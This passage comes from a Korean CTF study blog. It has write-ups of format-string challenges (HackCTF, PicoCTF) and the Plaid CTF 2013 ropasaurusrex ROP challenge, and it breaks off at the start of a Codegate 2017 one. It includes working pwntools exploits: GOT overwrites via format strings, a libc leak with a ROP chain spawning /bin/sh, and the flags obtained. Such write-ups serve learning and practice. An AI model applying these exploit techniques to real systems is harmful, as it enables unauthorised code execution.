class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-808h]</span></span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [esp+400h] [ebp-408h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input : &quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;format, <span class="number">0x400</span>u, &amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EN)you have successfully modified the value :)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aKr);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>IDA를 이용해서 코드로 변환을 해주었습니다. main 함수를 보면 vuln 함수를 호출하고 있고, vulln 함수를 보면 snprintf 함수에서 두 번째 매개변수로 서식 문자가 정의되어 있지 않아 FSB 취약점이 발생합니다. 그래서 FSB 취약점을 이용해서 printf 함수의 got를 flag 함수의 주소로 덮어주면 printf 함수가 실행될 때, flag 함수가 실행이 될 것 입니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@py:~&#x2F;pwn&#x2F;HackCTF&#x2F;B_F# .&#x2F;basic_fsb</span><br><span class="line">input : aaaa.%x.%x.%x.%x.%x</span><br><span class="line">aaaa.f7fc5c75.61616161.2e78252e.252e7825.78252e78</span><br><span class="line">root@py:~&#x2F;pwn&#x2F;HackCTF&#x2F;B_F#</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; gdb -q .&#x2F;basic_fsb</span><br><span class="line">gdb-peda$ x&#x2F;i 0x80483d0</span><br><span class="line">   0x80483d0 &lt;printf@plt&gt;:      jmp    DWORD PTR ds:0x804a00c</span><br><span class="line">gdb-peda$ p flag</span><br><span class="line">$2 &#x3D; &#123;&lt;text variable, no debug info&gt;&#125; 0x80485b4 &lt;flag&gt;</span><br><span class="line">gdb-peda$ </span><br></pre></td></tr></table></figure><p><strong>바이너리 파일을 실행해서 오프셋을 확인해보니 두 번째 서식 문자에서 <code>aaaa</code>의 값이 출력되는 것을 볼 수 있고, printf got, flag 함수의 주소는 위와 같습니다.</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3002</span>)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">2</span>, &#123;<span class="number">0x804a00c</span>:<span class="number">0x80485b4</span>&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32 비트에서는 fmtstr_payload 함수를 이용해도 잘 되지만 64 비트에서는 거의 안 됨.</span></span><br><span class="line"><span class="comment"># 처음 풀 때 어려워 했는데 이해하고 다시 보니, webhacking.kr 1번 문제 느낌.</span></span><br></pre></td></tr></table></figure><blockquote><p>FLAG : HackCTF{여보게_오늘_반찬은_포맷스트링이_어떠한가?}</p></blockquote><hr><p>PicoCTF Challenge : authenticate</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> authenticated = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">flag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">48</span>];</span><br><span class="line">  FILE *file;</span><br><span class="line">  file = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fgets(flag, <span class="keyword">sizeof</span>(flag), file);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_flag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!authenticated) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sorry, you are not *authenticated*!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Access Granted.\n&quot;</span>);</span><br><span class="line">    flag();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">64</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Set the gid to the effective gid</span></span><br><span class="line">  <span class="comment">// this prevents /bin/sh from dropping the privileges</span></span><br><span class="line">  <span class="keyword">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Would you like to read the flag? (yes/no)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fgets(buf, <span class="keyword">sizeof</span>(buf), <span class="built_in">stdin</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;no&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Okay, Exiting...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;yes&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Received Unknown Input:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  read_flag();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>main 함수 else if 문을 보면 printf 함수를 호출하는 데 이때 FSB 취약점이 발생합니다. 그리고 flag는 read_flag 함수에서 authenticated의 값이 참이면 flag 함수를 호출해서 flag를 출력해줍니다. 즉 전역 변수인 authenticated의 값을 FSB 취약점을 이용해서 참(1)으로 변조하면 됩니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@py:~&#x2F;pwn&#x2F;picoCTF# .&#x2F;auth</span><br><span class="line">Would you like to read the flag? (yes&#x2F;no)</span><br><span class="line">aaaa.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x</span><br><span class="line">Received Unknown Input:</span><br><span class="line"></span><br><span class="line">aaaa.80489a6.f7ec1580.804875a.f7ec1000.ff992024.ff992028.ff9920f4.3.0.0.61616161.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.Sorry, you are not *authenticated*!</span><br></pre></td></tr></table></figure><p><strong>바이너리 파일을 이용해 오프셋을 확인해 보니 11인 것을 알 수 있었습니다.</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;2018shell2.picoctf.com&quot;</span>, <span class="number">52918</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./auth&quot;</span>)</span><br><span class="line">auth = e.sym[<span class="string">&#x27;authenticated&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">11</span>, &#123;auth:<span class="number">1</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_d29a706d}</p></blockquote><hr><h2 id="PWN-D-2-2021-01-26"><a href="#PWN-D-2-2021-01-26" class="headerlink" title="PWN D+2 (2021.01.26)"></a>PWN D+2 (2021.01.26)<br></h2><hr><p>Plaid CTF 2013 - Challenge : ropasaurusrex </p><p><strong>이번에 풀어 볼 문제는 Plaid CTF 2013에서 나온 32 bit ROP 문제입니다. 32 bit ROP를 이해하고, 풀어보니 포너블 뉴비분들은 재밌게 풀 수 있을 거 같습니다. 일단 IDA를 이용해서 바이너리를 코드로 변환 시켜 주겠습니다.</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_80483F4();</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;WIN\n&quot;</span>, <span class="number">4u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>main() 함수를 보면 sub_80483F4() 함수를 호출하고, <code>WIN</code>을 출력하고 끝나는 것을 볼 수 있습니다.</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_80483F4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+10h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sub_80483F4() 함수를 보면 buf라는 변수를 정의하고, read 함수를 이용해서 buf의 입력 받고 있습니다. 하지만 buf의 크기는 88h인데 read() 함수에세ㅓ 100h 만큼 입력 받고 있기 때문에 BOF 취약점이 발생합니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ .&#x2F;ropasaurusrex </span><br><span class="line">AAAA</span><br><span class="line">WIN</span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ </span><br></pre></td></tr></table></figure><p><strong>위 결과는 바이너리 파일을 실행시킨 것 입니다. 입력을 받고, <code>WIN</code>을 출력함과 동시에 종료되는 것을 볼 수 있습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ checksec --file&#x3D;ropasaurusrex</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILE</span><br><span class="line">No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols  No01ropasaurusrex</span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ </span><br></pre></td></tr></table></figure><p><strong>위 결과는 checksec를 이용해 보호 기법을 확인한 결과인데, 보면 NX Bit가 활성화 되어 있는 것을 볼 수 있습니다. NX Bit가 활성화 되어 있기 때문에 BOF 취약점을 이용해서 buf에 쉘코드를 삽입하고, ret에 buf를 준다고해도 실행 권한이 없어 실행되지 않을 것 입니다. 하지만 ROP를 이용해서 NX Bit를 우회해 익스를 진행할 수 있습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas read</span><br><span class="line">Dump of assembler code for function read@plt:</span><br><span class="line">   0x0804832c &lt;+0&gt;:jmp    DWORD PTR ds:0x804961c</span><br><span class="line">   0x08048332 &lt;+6&gt;:push   0x18</span><br><span class="line">   0x08048337 &lt;+11&gt;:jmp    0x80482ec</span><br><span class="line">End of assembler dump.</span><br><span class="line">gdb-peda$ disas write</span><br><span class="line">Dump of assembler code for function write@plt:</span><br><span class="line">   0x0804830c &lt;+0&gt;:jmp    DWORD PTR ds:0x8049614</span><br><span class="line">   0x08048312 &lt;+6&gt;:push   0x8</span><br><span class="line">   0x08048317 &lt;+11&gt;:jmp    0x80482ec</span><br><span class="line">End of assembler dump.</span><br><span class="line">gdb-peda$</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; read got  : 0x0804961c</span><br><span class="line">&#x2F;&#x2F; read plt  : 0x0804832c</span><br><span class="line">&#x2F;&#x2F; write got : 0x08049614</span><br><span class="line">&#x2F;&#x2F; write plt : 0x0804830c</span><br></pre></td></tr></table></figure><p><strong>gdb를 이용해서 read/write의 plt/got를 알아냈습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ objdump -d ropasaurusrex | grep -B4 &quot;ret&quot;</span><br><span class="line">(생략)</span><br><span class="line">--</span><br><span class="line"> 80484b5:5b                   pop    %ebx</span><br><span class="line"> 80484b6:5e                   pop    %esi</span><br><span class="line"> 80484b7:5f                   pop    %edi</span><br><span class="line"> 80484b8:5d                   pop    %ebp</span><br><span class="line"> 80484b9:c3                   ret    </span><br><span class="line"> 80484ba:8b 1c 24             mov    (%esp),%ebx</span><br><span class="line"> 80484bd:c3                   ret    </span><br><span class="line">--</span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; pop pop pop r : 0x080484b6</span><br></pre></td></tr></table></figure><p><strong>objdump를 이용해서 pppr을 알아냈습니다 pppr을 구하는 이유는 read/write 함수의 인자는 3개이기 때문입니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ objdump -d &#x2F;lib32&#x2F;libc.so.6 | grep __read</span><br><span class="line">(생략)</span><br><span class="line">   df11b:e8 00 65 00 00       call   e5620 &lt;__read@@GLIBC_2.0&gt;</span><br><span class="line">   df27a:e8 a1 63 00 00       call   e5620 &lt;__read@@GLIBC_2.0&gt;</span><br><span class="line">   df42e:e8 ed 61 00 00       call   e5620 &lt;__read@@GLIBC_2.0&gt;</span><br><span class="line">000e5620 &lt;__read@@GLIBC_2.0&gt;:</span><br><span class="line">   e5639:75 1d                jne    e5658 &lt;__read@@GLIBC_2.0+0x38&gt;</span><br><span class="line">   e564c:77 52                ja     e56a0 &lt;__read@@GLIBC_2.0+0x80&gt;</span><br><span class="line">   e5680:77 28                ja     e56aa &lt;__read@@GLIBC_2.0+0x8a&gt;</span><br><span class="line">(생략)</span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ objdump -d &#x2F;lib32&#x2F;libc.so.6 | grep system</span><br><span class="line">0003ce10 &lt;__libc_system@@GLIBC_PRIVATE&gt;:</span><br><span class="line">   3ce24:74 0a                je     3ce30 &lt;__libc_system@@GLIBC_PRIVATE+0x20&gt;</span><br><span class="line">00127030 &lt;svcerr_systemerr@@GLIBC_2.0&gt;:</span><br><span class="line">  12708b:75 04                jne    127091 &lt;svcerr_systemerr@@GLIBC_2.0+0x61&gt;</span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; read offset   : 0xe5620</span><br><span class="line">&#x2F;&#x2F; system offset : 0x3ce24</span><br></pre></td></tr></table></figure><p><strong>objdump를 이용해서 read/system offset을 구했습니다. read offset은 libc의 주소를 릭 하는데 사용되고, system offset은 나중에 system 주소를 릭할 때 사용됩니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc &#x3D; read_addr - read_offset</span><br><span class="line">system &#x3D; libc + system_offset</span><br></pre></td></tr></table></figure><p><strong>위와 같이 read addr에서 read offset을 빼주면 libc의 시작 주소가 나올 것이고, libc에서 system offset 만큼 더해주면 system 함수의 시작 주소가 나올 것 입니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ objdump -h ropasaurusrex </span><br><span class="line"></span><br><span class="line">ropasaurusrex:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA       LMA       File off  Algn</span><br><span class="line">(생략)</span><br><span class="line"> 24 .bss          00000008  08049628  08049628  00000628  2**2</span><br><span class="line">                  ALLOC</span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>마지막으로 objdump를 이용해서 <code>/bin/sh</code>을 저장할 bss 영역의 주소를 알아냈습니다</strong><br></p><ul><li>시나리오<br></li></ul><ol><li>write 함수를 호출해서 read 주소를 릭한다. read 주소랑 read offset이랑 빼서 libc의 시작 주소를 구하고, libc의 시작 주소에 system offset을 더해서 system의 시작 주소를 구한다.<br></li><li>read 함수를 호출해서 bss 영역에 <code>&quot;/bin/sh&quot;</code>을 넣어준다.</li><li>read 함수를 호출해서 read got의 system addr을 넣어준다.</li><li>read 함수를 호출하면 (3)에서 read got가 system addr로 덮였기 때문에 system 함수가 호출이 되고, 인자값으로는 bss를 넘겨준다. bss에는 <code>&quot;/bin/sh&quot;</code>가 들어있다.<br></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ropasaurusrex&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_plt = <span class="number">0x0804832c</span></span><br><span class="line">read_got = <span class="number">0x0804961c</span></span><br><span class="line">read_off = <span class="number">0xe5620</span></span><br><span class="line">write_plt = <span class="number">0x0804830c</span></span><br><span class="line">write_got = <span class="number">0x08049614</span></span><br><span class="line">pppr = <span class="number">0x080484b6</span></span><br><span class="line">dynamic = <span class="number">0x08049530</span></span><br><span class="line">system_off = <span class="number">0x3ce10</span> </span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * (<span class="number">136</span> + <span class="number">4</span>) <span class="comment"># buffer + sfp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 시나리오 (1)</span></span><br><span class="line">payload += p32(write_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(read_got)</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 시나리오 (2)</span></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(dynamic)</span><br><span class="line">payload += p32(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 시나리오 (3)</span></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(read_got)</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 시나리오 (4)</span></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(<span class="number">0x41414141</span>)</span><br><span class="line">payload += p32(dynamic)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">readaddr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = readaddr - read_off</span><br><span class="line">system = libc_base + system_off</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.send(p32(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ python exploit.py </span><br><span class="line">[+] Starting local process &#39;.&#x2F;ropasaurusrex&#39;: pid 8695</span><br><span class="line">0xf7d6e000</span><br><span class="line">0xf7daae10</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid&#x3D;1000(pocas) gid&#x3D;1000(pocas) groups&#x3D;1000(pocas),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="line">$ cat key</span><br><span class="line">you_cant_stop_the_ropasaurusrex</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><blockquote><p>FLAG : you_cant_stop_the_ropasaurusrex</p></blockquote><hr><h2 id="PWN-D-3-2021-01-27"><a href="#PWN-D-3-2021-01-27" class="headerlink" title="PWN D+3 (2021.01.27)"></a>PWN D+3 (2021.01.27)<br></h2><hr><p>Codagate 2017 Challenge : BabyPwn</p><p><strong>이번에는 Canary Leak + ROP를 이용한 문제를 풀어보겠습니다. 방금 Canary에 대해 공부를 하고, Canary 릭을 해서 푸는 문제가 없나 보니 코게 문제로 하나가 있어 풀어보겠습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Codagate 2017$ checksec --file&#x3D;babypwn</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILE</span><br><span class="line">Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols  No01babypwn</span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Codagate 2017$ </span><br></pre></td></tr></table></figure><p><strong>checksec을 이용해서 보호 기법을 확인해보니, 카나리와, 